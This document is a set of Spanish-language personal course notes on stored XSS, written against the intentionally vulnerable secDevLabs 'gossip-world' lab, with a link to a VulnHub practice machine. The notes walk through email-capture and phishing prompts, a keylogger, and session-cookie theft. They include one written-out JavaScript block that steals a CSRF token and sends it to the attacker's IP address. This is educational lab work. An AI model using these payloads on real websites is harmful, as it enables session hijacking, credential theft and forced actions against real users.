## Mis apuntes:

En esta clase ocuparemos, un proyecto de github, especificamente secDevLabs/owasp-top10-2021-apps/a3/gossip-world, en este momento pasaremos a probar hacer los ejercicios correspondientes: 

![[Pasted image 20240220125218.png]]
Una vez montada la maquina vamos al localhost:10007 y nos encontraremos con este login, nos crearemos a una cuenta gratis.
En este caso las credenciales que ocupamos fueron `gonza:gonza123`.
Cuando entramos a la new gossip, vemos el formulario para poder poner un posteo: 
![[Pasted image 20240220131741.png]]
Al ir al inicio podemos, ver lo siguiente: 
![[Pasted image 20240220131820.png]]
Dentro del post vemos lo siguiente: 
![[Pasted image 20240220131845.png]]
Ahora si hacemos una prueba poniendo etiquetas html dentro del post veremos si lo interpretan:
![[Pasted image 20240220132232.png]]
Podemos ver que la página si nos interpreta el codigo html:
![[Pasted image 20240220132426.png]]
Ahora podemos probar un XSS, para esto tenemos que ver si la página nos soporta las tarjetas `<script></script>`, lo aplicariamos de la siguiente manera: 
![[Pasted image 20240220152815.png]]
**nota:** el alert dentro de las etiquetas tiene que ser todo con minusculas.
Las respuestas 
![[Pasted image 20240220152936.png]]
Ahora con esto podemos saber si es vulnerable a un XSS attack, ahora con esto podemos ver que se pueden hacer cosas más complejas, como por ejemplo que tengan que rellenar datos dentro de la tarjetita para poder ver el post, por lo que podemos hacer lo siguiente en un script de JavaScript: 
![[Pasted image 20240220155147.png]]
Este script lo que hace es pedir dentro de la tarjeta introducir un email para poder capturarlo enviándolo a nuestra ip.
![[Pasted image 20240220163440.png]]
hacemos el post simulando que es un post protegido y que solo se ve cuando se facilita un correo: 
![[Pasted image 20240220163531.png]]
si le damos a cancel veremos que nos da un mensaje: 
![[Pasted image 20240220163552.png]]
vemos el post vacío: 
![[Pasted image 20240220163629.png]]
ahora si hacemos un servidor http, podremos ver la petición que nos llega con la info que se proporciona a través de la página: 
![[Pasted image 20240220172153.png]]
En este caso vemos que lo que nos manda es un `gonza@gonza.com` después del parametro descriptivo email=.
Si lo queremos llevar al siguiente nivel podemos montarnos un script que puede ser utilizado en phishing:
![[Pasted image 20240220175952.png]]
podemos ver en la página del post como queda el script: 
![[Pasted image 20240220180334.png]]
Y a continuación veremos la captura de los datos al apretar el boton submit: 
![[Pasted image 20240220180426.png]]
Ahora podemos ver como se podria ocupar un keylogger dentro de una pagina web para poder detectar el teclado en vivo, y es con el siguiente script: 
![[Pasted image 20240221125938.png]]
ahora esto si lo posteamos y escribimos algo dentro de los comentarios o en algún lado donde se pueda escribir como el buscador podremos montarnos un servidor http donde recibiremos toda la información del teclado: 
![[Pasted image 20240221130255.png]]
y en el servidor podriamos ver lo siguiente: 
![[Pasted image 20240221130727.png]]
Ahora podemos hacer un filtro para poder ver de mejor forma el input: 
![[Pasted image 20240221133526.png]]
Lo único malo es que los espacios y los caracteres especiales los url encodea. 
para quitar los url encode se hace de la siguiente manera: 
![[Pasted image 20240221154717.png]]
El siguiente script nos sirve para poder redireccionar al usuario a una página que el atacante quiera: 
![[Pasted image 20240221155212.png]]
Para hacer un XSS, no necesariamente se tienen que hacer desde la misma página la inyección de código malicioso, sino que también puede estar desde un servidor tercero, esto se hace de la siguiente manera: 
Primero debemos hacer un par de cosas antes de hacer este script, para que podamos robar la cookie de sesión, hay que ver dentro del panel de configuración [storage], donde se almacenan las cookies que este sin el tick en httponly, esta es una barrera que nos impide tomar secuestrada una cookie de sesión.
![[Pasted image 20240221162728.png]]
el script que esta llamando esta etiqueta es el siguiente: 
![[Pasted image 20240221163058.png]]
en el cual tenemos una variable request que es de tipo XMLHttpRequest(), la cual abrirá una peticion de tipo GET, a la ip mostrada en pantalla, que enviara el document.cookie de la persona que abra el post, por lo que si lo abrimos con una cuenta llamada test, pasara lo siguiente: 
![[Pasted image 20240221163503.png]]
obtengo la cookie de sesion de test.
podemos comprobarlo copiando y pegando la cookie de sesión en el storage del menu: 
![[Pasted image 20240221165050.png]]
Si queremos hacer que el otro usuario haga un post automatico al ver nuestro post, podemos hacer lo siguiente: 
Con Burpsuite podemos capturar el request del post para ver como se envia hacia el servidor y ver que datos son necesarios para hacer este:
![[Pasted image 20240221165537.png]]
Podemos ver claramente que hay 4 campos necesarios el que más nos podría costar es que el csrf_token puede ser dinámico por lo que nos podría complicar la automatización de un post.
dentro del codigo este puede ser un parametro oculto por lo que si vemos el codigo fuente podemos ver que esta dentro de las etiquetas:
![[Pasted image 20240221165906.png]]
En este ejemplo podemos ver que el csrf_token no es dinamico pero haremos ejemplo de 2 tipos como si fuera y como si no lo fuera: 
![[Pasted image 20240221170658.png]]
este script sirve para poder ver el codigo csrf_token de la pagina para poder obtener el valor indicado en caso de que sea dinamico.
![[Pasted image 20240221184935.png]]
ahora con el siguiente comando podemos ver lo que pasa con nuestro mensaje encriptado
```
echo -n "PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KCiAgPGhlYWQ+CgogICAgPG1ldGEgY2hhcnNldD0idXRmLTgiPgogICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLCBzaHJpbmstdG8tZml0PW5vIj4KICAgIDxtZXRhIG5hbWU9ImRlc2NyaXB0aW9uIiBjb250ZW50PSIiPgogICAgPG1ldGEgbmFtZT0iYXV0aG9yIiBjb250ZW50PSIiPgoKICAgIDx0aXRsZT5Hb3NzaXAgV29ybGQgLSA8L3RpdGxlPgoKICAgIDwhLS0gQm9vdHN0cmFwIGNvcmUgQ1NTIC0tPgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSIvc3RhdGljL2Nzcy9ib290c3RyYXAubWluLmNzcyI+CgoKICAgIDwhLS0gQ3VzdG9tIHN0eWxlcyBmb3IgdGhpcyB0ZW1wbGF0ZSAtLT4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iL3N0YXRpYy9jc3MvYmxvZy1wb3N0LmNzcyI+CiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Ii9zdGF0aWMvY3NzL2xvZ2luLmNzcyI+CiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Ii9zdGF0aWMvY3NzL25ld3Bvc3QuY3NzIj4KCgogIDwvaGVhZD4KCiAgPGJvZHk+CgogICAgPCEtLSBOYXZpZ2F0aW9uIC0tPgogICAgPG5hdiBjbGFzcz0ibmF2YmFyIG5hdmJhci1leHBhbmQtbGcgbmF2YmFyLWRhcmsgYmctZGFyayBmaXhlZC10b3AiPgogICAgICA8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogICAgICAgIDxhIGNsYXNzPSJuYXZiYXItYnJhbmQiIGhyZWY9Ii9nb3NzaXAiPkdvc3NpcCBXb3JsZDwvYT4KICAgICAgICA8YnV0dG9uIGNsYXNzPSJuYXZiYXItdG9nZ2xlciIgdHlwZT0iYnV0dG9uIiBkYXRhLXRvZ2dsZT0iY29sbGFwc2UiIGRhdGEtdGFyZ2V0PSIjbmF2YmFyUmVzcG9uc2l2ZSIgYXJpYS1jb250cm9scz0ibmF2YmFyUmVzcG9uc2l2ZSIgYXJpYS1leHBhbmRlZD0iZmFsc2UiIGFyaWEtbGFiZWw9IlRvZ2dsZSBuYXZpZ2F0aW9uIj4KICAgICAgICAgIDxzcGFuIGNsYXNzPSJuYXZiYXItdG9nZ2xlci1pY29uIj48L3NwYW4+CiAgICAgICAgPC9idXR0b24+CiAgICAgICAgPGRpdiBjbGFzcz0iY29sbGFwc2UgbmF2YmFyLWNvbGxhcHNlIiBpZD0ibmF2YmFyUmVzcG9uc2l2ZSI+CiAgICAgICAgICA8dWwgY2xhc3M9Im5hdmJhci1uYXYgbWwtYXV0byI+CiAgICAgICAgICAgIDxsaSBjbGFzcz0ibmF2LWl0ZW0iPgogICAgICAgICAgICAgIDxhIGNsYXNzPSJuYXYtbGluayIgaHJlZj0iL2dvc3NpcCI+SG9tZTwvYT4KICAgICAgICAgICAgPC9saT4KICAgICAgICAgICAgPGxpIGNsYXNzPSJuYXYtaXRlbSBhY3RpdmUiPgogICAgICAgICAgICAgIDxhIGNsYXNzPSJuYXYtbGluayIgaHJlZj0iL25ld2dvc3NpcCI+TmV3IGdvc3NpcAogICAgICAgICAgICAgICAgIDxzcGFuIGNsYXNzPSJzci1vbmx5Ij4oY3VycmVudCk8L3NwYW4+CiAgICAgICAgICAgICAgPC9hPgogICAgICAgICAgICA8L2xpPgogICAgICAgICAgICA8bGkgY2xhc3M9Im5hdi1pdGVtIj4KICAgICAgICAgICAgICA8YSBjbGFzcz0ibmF2LWxpbmsiIGhyZWY9Ii9sb2dvdXQiPkxvZ291dDwvYT4KICAgICAgICAgICAgPC9saT4KICAgICAgICAgIDwvdWw+CiAgICAgICAgPC9kaXY+CiAgICAgIDwvZGl2PgogICAgPC9uYXY+CgoKICAgICAgIDxicj4KICAgICAgIDxicj4KICAgICAgIDxkaXYgY2xhc3M9ImRpdi1wb3N0LXNpemUiPgogICAgICAgCTxkaXYgY2xhc3M9InBhbmVsIHBhbmVsLWRlZmF1bHQiPgogICAgICAgCQk8ZGl2IGNsYXNzPSJwYW5lbC1ib2R5Ij4KICAgICAgICAgICAgICAgIDxicj4KICAgICAgICAgICAgICAgIDxicj4KCiAgICAgICAgICAgICAgICA8Y2VudGVyPjxoND5OZXcgZ29zc2lwPC9oND48L2NlbnRlcj4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lciI+CiAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAJCQk8Zm9ybSBhY3Rpb249Ii9uZXdnb3NzaXAiIG5hbWU9Im5ld2dvc3NpcCIgbWV0aG9kPSJQT1NUIiA+CiAgICAgICAJCQkJPGNlbnRlcj48aW5wdXQgdHlwZT0idGV4dCIgY2xhc3M9ImlucHV0LWxvZ2luIiB2YWx1ZT0iIiBuYW1lPSAidGl0bGUiIGFyaWEtZGVzY3JpYmVkYnk9InNpemluZy1hZGRvbjEiICBtYXhsZW5ndGg9IjEwMCIgcGxhY2Vob2xkZXI9IlRpdGxlIj48L2NlbnRlcj4KICAgICAgIAkJCQk8YnI+CiAgICAgICAgICAgICAgICAgIDxjZW50ZXI+PGlucHV0IHR5cGU9InRleHQiIGNsYXNzPSJpbnB1dC1sb2dpbiIgdmFsdWU9IiIgbmFtZT0gInN1YnRpdGxlIiBhcmlhLWRlc2NyaWJlZGJ5PSJzaXppbmctYWRkb24xIiAgbWF4bGVuZ3RoPSIyMDAiIHBsYWNlaG9sZGVyPSJTdWJ0aXRsZSI+PC9jZW50ZXI+CiAgICAgICAJCQkJPGJyPgogICAgICAgICAgICAgICAgICA8Y2VudGVyPjx0ZXh0YXJlYSBjbGFzcz0iaW5wdXQtbG9naW4iIHZhbHVlPSIiIG5hbWU9ICJ0ZXh0IiBhcmlhLWRlc2NyaWJlZGJ5PSJzaXppbmctYWRkb24xIiAgbWF4bGVuZ3RoPSIyMDAwIiByb3dzPSIxMCIgcGxhY2Vob2xkZXI9IlRleHQiPjwvdGV4dGFyZWE+PC9jZW50ZXI+CiAgICAgICAJCQkJPGJyPgogICAgICAgCQkJCTxpbnB1dCBuYW1lPSJfY3NyZl90b2tlbiIgdHlwZT0iaGlkZGVuIiB2YWx1ZT0iNDU5ZTFhMDQtYmE3Yi00MWU4LTlkYjktYjgxOWM2ZWNkMjEyIj4KICAgICAgIAkJCQk8YnV0dG9uIHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ0biBmdWxsLXdpZHRoIiBzdHlsZT0id2lkdGg6IDEwMCU7ICI+R08hPC9idXR0b24+CiAgICAgICAJCQk8L2Zvcm0+CiAgICAgICAJCTwvZGl2PgogICAgICAgCTwvZGl2PgogICAgICAgPC9kaXY+CiAgICAgICA8L2JyPgogICAgICAgPC9icj4KCiAgICA8IS0tIEZvb3RlciAtLT4KICAgIDxmb290ZXIgY2xhc3M9InB5LTUgYmctZGFyayI+CiAgICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lciI+CiAgICAgICAgPHAgY2xhc3M9Im0tMCB0ZXh0LWNlbnRlciB0ZXh0LXdoaXRlIj5Db3B5cmlnaHQgJmNvcHk7IEdvc3NpcCBXb3JsZCAyMDE4PC9wPgogICAgICA8L2Rpdj4KICAgICAgPCEtLSAvLmNvbnRhaW5lciAtLT4KICAgIDwvZm9vdGVyPgoKICAgIDwhLS0gQm9vdHN0cmFwIGNvcmUgSmF2YVNjcmlwdCAtLT4KICAgIDxzY3JpcHQgc3JjPSJ2ZW5kb3IvanF1ZXJ5L2pxdWVyeS5taW4uanMiPjwvc2NyaXB0PgogICAgPHNjcmlwdCBzcmM9InZlbmRvci9ib290c3RyYXAvanMvYm9vdHN0cmFwLmJ1bmRsZS5taW4uanMiPjwvc2NyaXB0PgoKICA8L2JvZHk+Cgo8L2h0bWw+" | base64 -d; echo

```
si lo ejecutamos podemos ver que es el codigo fuente:
![[Pasted image 20240221190920.png]]
con el siguiente script deberíamos obtener el token: 
```
var domain = "http://localhost:10007/newgossip"; 
var req1 = new XMLHttpRequest();
req1.open('GET', domain, false); /*El parametro false es para indicar que es una tarea sincorna (es decir que espere el flujo del programa)*/
req1.send(); 

var response = req1.responseText; 
var parser = new DOMParser();
var doc = parser.parseFromString(response, 'text/html');
var token = doc.getElementByName("_csrf_token")[0].value;

var req2 = new XMLHttpRequest();
req2.open('GET', 'http://192.168.1.89/?token=' + token);
req2.send();
```
ahora puede cambiar este csrf_token, por lo que se puede agregar la linea `req1.withCredentials = true` dentro de la primera linea: 
Por lo que ahora podemos montar lo siguiente: 
![[Pasted image 20240222143546.png]]
Esto podemos hacer que el usuario que se meta a nuestro post, haga uno con un mensaje que nosotros codifiquemos.
![[Pasted image 20240222144623.png]]




----
## Datos de la clase: 

Una vulnerabilidad **XSS** (**Cross-Site Scripting**) es un tipo de vulnerabilidad de seguridad informática que permite a un atacante ejecutar código malicioso en la página web de un usuario sin su conocimiento o consentimiento. Esta vulnerabilidad permite al atacante robar información personal, como nombres de usuario, contraseñas y otros datos confidenciales.

En esencia, un ataque XSS implica la inserción de código malicioso en una página web vulnerable, que luego se ejecuta en el navegador del usuario que accede a dicha página. El código malicioso puede ser cualquier cosa, desde scripts que redirigen al usuario a otra página, hasta secuencias de comandos que registran pulsaciones de teclas o datos de formularios y los envían a un servidor remoto.

Existen varios tipos de vulnerabilidades XSS, incluyendo las siguientes:

- **Reflejado** (**Reflected**): Este tipo de XSS se produce cuando los datos proporcionados por el usuario **se reflejan en la respuesta** HTTP sin ser verificados adecuadamente. Esto permite a un atacante inyectar código malicioso en la respuesta, que luego se ejecuta en el navegador del usuario.
- **Almacenado** (**Stored**): Este tipo de XSS se produce cuando un atacante **es capaz de almacenar código malicioso** en una base de datos o en el servidor web que aloja una página web vulnerable. Este código se ejecuta cada vez que se carga la página.
- **DOM-Based**: Este tipo de XSS se produce cuando el código malicioso **se ejecuta en el navegador del usuario a través del DOM** (Modelo de Objetos del Documento). Esto se produce cuando el código JavaScript en una página web modifica el DOM en una forma que es vulnerable a la inyección de código malicioso.

Los ataques XSS pueden tener graves consecuencias para las empresas y los usuarios individuales. Por esta razón, es esencial que los desarrolladores web implementen medidas de seguridad adecuadas para prevenir vulnerabilidades XSS. Estas medidas pueden incluir la validación de datos de entrada, la eliminación de código HTML peligroso, y la limitación de los permisos de JavaScript en el navegador del usuario.

A continuación, se proporciona el proyecto de Github correspondiente al laboratorio que nos estaremos montando para poner en práctica la vulnerabilidad XSS:

- **secDevLabs**: [https://github.com/globocom/secDevLabs](https://github.com/globocom/secDevLabs)
# **Parte 2

En esta clase, trataremos de resolver una máquina de la plataforma de **Vulnhub** para practicar los ataques XSS.

Vulnhub es una plataforma de seguridad informática que se centra en la creación y distribución de máquinas virtuales vulnerables con el fin de mejorar las habilidades de los profesionales de la seguridad informática. La plataforma proporciona una amplia variedad de máquinas virtuales (VM) que se han configurado para contener vulnerabilidades deliberadas que pueden ser explotadas para aprender y reforzar técnicas de hacking.

A continuación, se proporciona el enlace a la máquina que nos descargamos en esta clase para practicar esta vulnerabilidad:

- **Máquina MyExpense**: [https://www.vulnhub.com/entry/myexpense-1,405/](https://www.vulnhub.com/entry/myexpense-1,405/)